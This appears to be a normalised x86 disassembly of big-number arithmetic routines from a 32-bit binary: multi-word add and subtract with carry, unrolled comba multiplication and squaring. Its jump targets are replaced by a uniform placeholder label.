mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ edi + 0xc ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
sub ebx 0x4
add edi 0x10
add esi 0x20
test ebx 0xfffffffc
jne r-xdata
mov eax [ edi ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
dec ebx
mov [ esi ] eax
mov [ esi + 0x4 ] edx
je r-xdata
mov eax [ edi + 0x4 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
dec ebx
mov [ esi + 0x8 ] eax
test ebx ebx
mov [ esi + 0xc ] edx
je r-xdata
mov edi [ edi + 0x8 ]
xor eax eax
push eax
push edi
push eax
push edi
call sub_1001d090
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
sub_100536a0
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
xor eax eax
push esi
xor esi esi
or eax edx
mov edx [ esp + 0x10 ]
or ecx esi
push esi
push edx
push ecx
push eax
call sub_1006af10
pop esi
retn
sub_100536c0
mov eax 0x8
call sub_1001d0d0
mov ecx [ esp + 0x18 ]
test ecx ecx
jg r-xdata
mov edx [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ edx ]
push edi
mov edi [ esp + 0x24 ]
xor eax eax
xor ebx ebx
mov edi [ edi ]
mov [ esp + 0x14 ] ebx
add esi edi
mov edi [ esp + 0x1c ]
adc eax ebx
dec ecx
test ecx ecx
mov [ edi ] esi
jle r-xdata
xor eax eax
add esp 0x8
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebx [ esp + 0x24 ]
mov esi [ edx + 0x4 ]
xor edi edi
xor ebp ebp
mov ebx [ ebx + 0x4 ]
add esi ebx
adc edi ebp
add eax esi
mov esi [ esp + 0x14 ]
mov [ esp + 0x14 ] ebp
adc esi edi
mov edi [ esp + 0x1c ]
dec ecx
mov [ edi + 0x4 ] eax
mov eax esi
test ecx ecx
jle r-xdata
mov ebx [ esp + 0x24 ]
mov esi [ edx + 0x8 ]
xor edi edi
mov [ esp + 0x14 ] ebp
mov ebx [ ebx + 0x8 ]
add esi ebx
adc edi ebp
add eax esi
mov esi ebp
adc esi edi
mov edi [ esp + 0x1c ]
dec ecx
mov [ edi + 0x8 ] eax
mov eax esi
test ecx ecx
jle r-xdata
mov ebx [ esp + 0x24 ]
mov esi [ edx + 0xc ]
xor edi edi
mov [ esp + 0x14 ] ebp
mov ebx [ ebx + 0xc ]
add esi ebx
adc edi ebp
add eax esi
mov esi ebp
adc esi edi
mov edi [ esp + 0x1c ]
dec ecx
mov [ edi + 0xc ] eax
mov eax esi
test ecx ecx
jle r-xdata
mov esi [ esp + 0x24 ]
add edx 0x10
add esi 0x10
add edi 0x10
mov [ esp + 0x24 ] esi
mov [ esp + 0x1c ] edi
mov edi [ edx ]
mov esi [ esi ]
xor ebx ebx
add edi esi
adc ebx ebp
add eax edi
mov edi [ esp + 0x1c ]
mov esi ebp
adc esi ebx
dec ecx
mov [ edi ] eax
mov eax esi
test ecx ecx
mov [ esp + 0x14 ] ebp
jg r-xdata
sub_100537d0
mov ecx [ esp + 0x10 ]
xor eax eax
test ecx ecx
jg r-xdata
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x1c ]
retn
mov ecx [ esp + 0x20 ]
dec ecx
test ecx ecx
mov [ esp + 0x20 ] ecx
jle r-xdata
sbb eax eax
neg eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
mov ebp ecx
sub ebp edx
sub ebp eax
cmp ecx edx
mov [ ebx + 0x4 ] ebp
je r-xdata
mov ecx [ esp + 0x20 ]
dec ecx
test ecx ecx
mov [ esp + 0x20 ] ecx
jle r-xdata
sbb eax eax
neg eax
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
mov ebp ecx
sub ebp edx
sub ebp eax
cmp ecx edx
mov [ ebx + 0x8 ] ebp
je r-xdata
mov ecx [ esp + 0x20 ]
dec ecx
test ecx ecx
mov [ esp + 0x20 ] ecx
jle r-xdata
sbb eax eax
neg eax
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
mov ebp ecx
sub ebp edx
sub ebp eax
cmp ecx edx
mov [ ebx + 0xc ] ebp
je r-xdata
mov ecx [ esp + 0x20 ]
dec ecx
test ecx ecx
mov [ esp + 0x20 ] ecx
jle r-xdata
sbb eax eax
neg eax
add esi 0x10
add edi 0x10
add ebx 0x10
jmp r-xdata
mov ecx [ esi ]
mov edx [ edi ]
mov ebp ecx
sub ebp edx
sub ebp eax
cmp ecx edx
mov [ ebx ] ebp
je r-xdata
sub_10053890
mov ecx [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov eax [ ecx ]
push edi
xor ebx ebx
mul [ esi ]
mov edi edx
mov edx [ esp + 0x14 ]
mov [ edx ] eax
mov eax [ esi + 0x4 ]
mul [ ecx ]
add edi eax
cmp edi eax
jae r-xdata
mov eax [ ecx + 0x4 ]
mov ebp edx
mul [ esi ]
add edi eax
cmp edi eax
jae r-xdata
inc edx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x4 ] edi
mov eax [ esi ]
mul [ ecx + 0x8 ]
add ebp eax
xor edi edi
cmp ebp eax
jae r-xdata
mov ebx 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x4 ]
add ebp eax
cmp ebp eax
jae r-xdata
mov edi 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x8 ] ebp
mov eax [ esi + 0xc ]
mul [ ecx ]
add ebx eax
xor ebp ebp
cmp ebx eax
jae r-xdata
inc edi
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x4 ]
add ebx eax
cmp ebx eax
jae r-xdata
mov ebp 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x8 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0xc ] ebx
mov eax [ ecx + 0x10 ]
mul [ esi ]
add edi eax
xor ebx ebx
cmp edi eax
jae r-xdata
inc ebp
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0xc ]
add edi eax
cmp edi eax
jae r-xdata
mov ebx 0x1
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x8 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x4 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x10 ]
mul [ ecx ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x10 ] edi
mov eax [ ecx ]
mul [ esi + 0x14 ]
add ebp eax
xor edi edi
cmp ebp eax
jae r-xdata
inc ebx
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ ecx + 0x4 ]
mul [ esi + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
mov edi 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x8 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0xc ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ ecx + 0x14 ]
mul [ esi ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x14 ] ebp
mov eax [ esi ]
mul [ ecx + 0x18 ]
add ebx eax
xor ebp ebp
cmp ebx eax
jae r-xdata
inc edi
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x14 ]
add ebx eax
cmp ebx eax
jae r-xdata
mov ebp 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x10 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi + 0xc ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x10 ]
mul [ ecx + 0x8 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0x4 ]
mul [ esi + 0x14 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x18 ] ebx
mov eax [ esi + 0x1c ]
mul [ ecx ]
add edi eax
xor ebx ebx
cmp edi eax
jae r-xdata
inc ebp
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x4 ]
add edi eax
cmp edi eax
jae r-xdata
mov ebx 0x1
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ ecx + 0x8 ]
mul [ esi + 0x14 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi + 0x10 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x10 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x14 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x18 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi ]
mul [ ecx + 0x1c ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x1c ] edi
mov eax [ esi + 0x4 ]
mul [ ecx + 0x1c ]
add ebp eax
xor edi edi
cmp ebp eax
jae r-xdata
inc ebx
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x18 ]
add ebp eax
cmp ebp eax
jae r-xdata
mov edi 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ ecx + 0x10 ]
mul [ esi + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x8 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x1c ]
mul [ ecx + 0x4 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x20 ] ebp
mov eax [ esi + 0x1c ]
mul [ ecx + 0x8 ]
add ebx eax
xor ebp ebp
cmp ebx eax
jae r-xdata
inc edi
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi + 0x18 ]
add ebx eax
cmp ebx eax
jae r-xdata
mov ebp 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0x10 ]
mul [ esi + 0x14 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0x14 ]
mul [ esi + 0x10 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x18 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x1c ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x24 ] ebx
mov eax [ esi + 0xc ]
mul [ ecx + 0x1c ]
add edi eax
xor ebx ebx
cmp edi eax
jae r-xdata
inc ebp
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x10 ]
mul [ ecx + 0x18 ]
add edi eax
cmp edi eax
jae r-xdata
mov ebx 0x1
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ ecx + 0x14 ]
mul [ esi + 0x14 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x10 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi + 0x1c ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x28 ] edi
mov eax [ ecx + 0x10 ]
mul [ esi + 0x1c ]
add ebp eax
xor edi edi
cmp ebp eax
jae r-xdata
inc ebx
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
mov edi 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ ecx + 0x18 ]
mul [ esi + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x10 ]
mul [ ecx + 0x1c ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x2c ] ebp
mov eax [ ecx + 0x1c ]
mul [ esi + 0x14 ]
add ebx eax
xor ebp ebp
cmp ebx eax
jae r-xdata
inc edi
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x18 ]
add ebx eax
cmp ebx eax
jae r-xdata
mov ebp 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ ecx + 0x14 ]
mul [ esi + 0x1c ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x0
mov [ edx + 0x30 ] ebx
mov eax [ esi + 0x1c ]
mul [ ecx + 0x18 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebp
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x18 ]
mul [ ecx + 0x1c ]
add edi eax
cmp edi eax
jae r-xdata
mov [ esp + 0x18 ] 0x1
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov ebx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edi
mov eax [ esi + 0x1c ]
mul [ ecx + 0x1c ]
add ebp eax
cmp ebp eax
jae r-xdata
inc [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
pop edi
add eax edx
mov [ ebx + 0x38 ] ebp
pop esi
mov [ ebx + 0x3c ] eax
pop ebp
pop ebx
retn
inc edx
sub_10053e40
mov ecx [ esp + 0x8 ]
push ebp
push esi
mov esi [ esp + 0x14 ]
mov eax [ ecx ]
push edi
mul [ esi ]
mov ebp edx
mov edx [ esp + 0x10 ]
xor edi edi
mov [ edx ] eax
mov eax [ esi + 0x4 ]
mul [ ecx ]
add ebp eax
cmp ebp eax
jae r-xdata
mov eax [ ecx + 0x4 ]
push ebx
mov ebx edx
mul [ esi ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edx
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0x4 ] ebp
mov eax [ esi ]
mul [ ecx + 0x8 ]
add ebx eax
xor ebp ebp
cmp ebx eax
jae r-xdata
mov edi 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x4 ]
add ebx eax
cmp ebx eax
jae r-xdata
mov ebp 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx ]
add ebx eax
cmp ebx eax
jae r-xdata
inc ebp
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ edx + 0x8 ] ebx
mov eax [ esi + 0xc ]
mul [ ecx ]
add edi eax
xor ebx ebx
cmp edi eax
jae r-xdata
inc ebp
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x4 ]
add edi eax
cmp edi eax
jae r-xdata
mov ebx 0x1
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esi + 0x4 ]
mul [ ecx + 0x8 ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ ecx + 0xc ]
mul [ esi ]
add edi eax
cmp edi eax
jae r-xdata
inc ebx
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
mov eax [ esp + 0x14 ]
mov [ eax + 0xc ] edi
mov eax [ esi + 0x4 ]
mul [ ecx + 0xc ]
add ebp eax
xor edi edi
cmp ebp eax
jae r-xdata
inc ebx
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0x8 ]
add ebp eax
cmp ebp eax
jae r-xdata
mov edi 0x1
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
mul [ ecx + 0x4 ]
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x0
mov [ edx + 0x10 ] ebp
mov eax [ esi + 0xc ]
mul [ ecx + 0x8 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc edi
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
mul [ ecx + 0xc ]
add ebx eax
cmp ebx eax
jae r-xdata
mov [ esp + 0x18 ] 0x1
add edi edx
cmp edi edx
jae r-xdata
inc edx
mov ebp [ esp + 0x14 ]
mov [ ebp + 0x14 ] ebx
mov eax [ ecx + 0xc ]
mul [ esi + 0xc ]
add edi eax
pop ebx
cmp edi eax
jae r-xdata
inc [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov [ ebp + 0x18 ] edi
add eax edx
pop edi
mov [ ebp + 0x1c ] eax
pop esi
pop ebp
retn
inc edx
sub_10053fd0
mov eax 0x10
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x24 ]
xor ecx ecx
push edi
mov eax [ esi ]
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov ecx [ esp + 0x24 ]
mov ebx edx
push 0x0
push 0x2
mov [ ecx ] eax
mov eax [ esi ]
mul [ esi + 0x4 ]
mov edi edx
mov ebp eax
push edi
push ebp
mov [ esp + 0x38 ] 0x0
call sub_1001d090
cmp edx edi
ja r-xdata
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov edi edx
mov edx [ esp + 0x24 ]
xor ecx ecx
mov [ edx + 0x4 ] ebx
mov eax [ esi + 0x4 ]
push ecx
push eax
push ecx
push eax
xor ebx ebx
call sub_1001d090
add edi eax
cmp edi eax
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x28 ] 0x1
cmp eax ebp
jae r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
inc [ esp + 0x28 ]
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi ]
mov ebp edx
push 0x2
push ebp
push eax
mov [ esp + 0x28 ] eax
call sub_1001d090
cmp edx ebp
ja r-xdata
mov ebx 0x1
add edi eax
cmp edi eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc ebx
cmp eax [ esp + 0x18 ]
jae r-xdata
mov eax [ esp + 0x24 ]
push 0x0
push 0x2
mov [ esp + 0x1c ] 0x0
mov [ eax + 0x8 ] edi
mov eax [ esi + 0xc ]
mul [ esi ]
mov edi edx
mov ebp eax
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc ebx
inc ebx
mov ecx [ esp + 0x28 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x28 ] ecx
jae r-xdata
jb r-xdata
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x14 ] 0x1
cmp eax ebp
jae r-xdata
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebp eax
push 0x2
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov edi [ esp + 0x14 ]
jb r-xdata
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
jne r-xdata
mov edi [ esp + 0x14 ]
inc edi
jmp r-xdata
cmp eax ebp
jae r-xdata
mov edx [ esp + 0x24 ]
mov [ edx + 0xc ] ecx
mov eax [ esi + 0x8 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
mov [ esp + 0x38 ] ecx
call sub_1001d090
add ebx eax
cmp ebx eax
jae r-xdata
inc edi
inc edi
mov ecx [ esp + 0x28 ]
add ecx eax
cmp ecx eax
jae r-xdata
add edi edx
cmp edi edx
mov [ esp + 0x14 ] edi
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebp eax
push 0x2
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
mov [ esp + 0x28 ] 0x1
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x14 ]
add eax edx
cmp eax edx
mov [ esp + 0x14 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebp
jae r-xdata
mov eax [ esi + 0x10 ]
push 0x0
mul [ esi ]
mov edi edx
mov ebp eax
push 0x2
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x14 ]
add eax edx
cmp eax edx
mov [ esp + 0x14 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebp
jae r-xdata
mov eax [ esp + 0x24 ]
push 0x0
push 0x2
mov [ esp + 0x18 ] 0x0
mov [ eax + 0x10 ] ebx
mov eax [ esi ]
mul [ esi + 0x14 ]
mov edi edx
mov ebx eax
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
mov ebx [ esp + 0x14 ]
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x10 ] 0x1
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebp eax
push 0x2
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x10 ]
cmp eax ebp
jae r-xdata
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0xc ]
mov edi edx
mov ebp eax
push 0x2
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
mov ebp [ esp + 0x10 ]
jb r-xdata
mov edi [ esp + 0x28 ]
add edi edx
cmp edi edx
jae r-xdata
inc edx
jne r-xdata
mov ebp [ esp + 0x10 ]
inc ebp
jmp r-xdata
cmp eax ebp
jae r-xdata
mov ecx [ esp + 0x24 ]
mov [ ecx + 0x14 ] ebx
mov eax [ esi + 0xc ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
mov [ esp + 0x24 ] ecx
call sub_1001d090
add edi eax
cmp edi eax
mov [ esp + 0x28 ] edi
jae r-xdata
inc ebp
inc ebp
add ebx eax
cmp ebx eax
jae r-xdata
add ebp edx
cmp ebp edx
mov [ esp + 0x10 ] ebp
jae r-xdata
inc edx
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0x10 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
mov [ esp + 0x14 ] 0x1
mov ebp [ esp + 0x28 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x14 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x14 ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x14 ]
cmp eax ebx
jae r-xdata
mov eax [ esi ]
push 0x0
mul [ esi + 0x18 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x14 ]
cmp eax ebx
jae r-xdata
mov edx [ esp + 0x24 ]
push 0x0
push 0x2
mov [ esp + 0x30 ] 0x0
mov [ edx + 0x18 ] ebp
mov eax [ esi + 0x1c ]
mul [ esi ]
mov edi edx
mov ebx eax
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x10 ] ecx
jae r-xdata
jb r-xdata
mov ebp [ esp + 0x14 ]
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x28 ] 0x1
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x18 ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x10 ] ecx
jae r-xdata
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebx
jae r-xdata
